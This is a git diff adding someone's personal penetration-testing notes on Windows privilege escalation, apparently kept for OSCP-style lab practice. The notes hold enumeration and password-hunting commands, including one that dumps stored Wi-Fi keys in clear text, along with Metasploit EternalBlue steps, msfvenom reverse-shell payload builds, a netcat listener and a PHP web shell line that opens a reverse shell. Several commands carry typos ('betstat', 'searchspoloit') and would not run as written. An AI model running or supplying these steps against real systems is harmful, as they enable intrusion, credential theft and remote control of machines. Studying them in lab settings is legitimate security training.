@@ -1,0 +1,132 @@
+###Resources:
+https://fuzzysecurity.com/tutorials/16.html
+https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#tools
+https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html
+https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
+
+
+###Gaining a Foothold:
+
+nmap -A -T4 -p- 10.10.10.10
+ftp 10.10.10.10
+put test.txt
+
+Using Nmap + RustScan > Access Ftp/ssh > using msfvenom and backdoor create > uploading via Ftp/ssh > triggure it via calling webpage > using msfconsole and execute it 
+
+Meterpreter Cheatsheet:
+https://github.com/puckel/Cheatsheets/blob/master/Cheatsheet_MetasploitPayloads.txt
+https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/msfvenom
+https://github.com/frizb/MSF-Venom-Cheatsheet
+https://github.com/NitescuLucian/nitesculucian.github.io/blob/master/_posts/2018-07-24-msfvenom-cheat-sheet.md
+https://nitesculucian.github.io/2018/07/25/msfvenom-cheat-sheet/
+
+###Command:
+
+System Enum:
+systeminfo
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+hostname
+wmic qfe
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.."
+wmic logicaldisk
+wmic logicaldisk get caption,description,providername
+
+###UserEnum:
+whoami
+whoami /priv
+whoami /groups
+net user
+
+###Network Enum:
+ipconfig
+arp -a
+route print
+betstat -ano
+
+###Password Hunting:
+findstr /si password *.txt
+findstr /si password *.xml
+findstr /si password *.ini
+findstr /si password *.xml *.ini *.txt *.config
+
+netsh wlan show profile
+netsh wlan show profile <SSID> key=clear
+
+###AV Enum:
+sc query windefend > 1[stopped] 2[start pending] 3[start pending] 4[running] 7[paused]
+sc queryex type=service
+netsh advfirewall dump
+netsh firewall show state
+netsh firewall show config
+
+###Automated Tools:
+
+winpeas.exe, seatbelt.exe, watson.exe, sharpup.exe, sherlock.ps1, powerup.ps1, jaws-enum.ps1, windows-exploit-suggester.py, Exploit Suggester
+
+Link:
+https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
+https://github.com/peass-ng/PEASS-ng/releases/tag/20241101-6f46e855
+https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation
+https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1
+https://github.com/rasta-mouse/Watson/blob/master/Watson.sln
+https://github.com/411Hall/JAWS
+https://github.com/AonCyberLabs/Windows-Exploit-Suggester
+
+
+###Kernel Exploit:
+A computer program that control everything in the System. Facilities interactions between Hardware and Software components.
+Payloads : https://github.com/SecWiki/windows-kernel-exploits
+
+Escalation with Metasploit:
+https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/multi/recon/local_exploit_suggester.md
+
+msfconsole
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS [target_ip]
+set LHOST [your_ip]
+set LPORT 4444
+run
+sessions
+use post/multi/recon/local_exploit_suggester
+set SESSION [session_id]
+run
+
+* Payload with msfvenom
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=[your_ip] LPORT=4444 -f exe -o shell.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=[your_ip] LPORT=4444 -f aspx -o shell.aspx
+* connect with ftp or ssh: put manual.aspx
+* Create a new tab: nc -nvlp 4444
+* Execute by url and find the shell
+
+###password:
+
+nmap -A -T4 -p- 10.10.10.10
+searchspoloit <name>
+then finding exploit and crack it
+
+systeninfo > net user > whoami > netstat -ano > arp -a > netstat -ano > ippcofig > 
+
+###Attacking Wsl:
+
+nmap -A -T4 -p- 10.10.10.10
+
+rustscan -a 10.10.10.10
+nmap -p 21,22,80 -sV 10.10.117.140 
+Then you can find exploit and you can access ftp or ssh or if port 80 then dirsearch etc
+
+smbclient -L \\\\10.10.10.10\\
+<?php system('nc.exe -e cmd.exe 10.10.10.10 4444')?>
+
+Spawning a TTY Shell : https://wiki.zacheller.dev/pentest/privilege-escalation/spawning-a-tty-shell
+
+
+
+
+
+
+
+
+
+
+
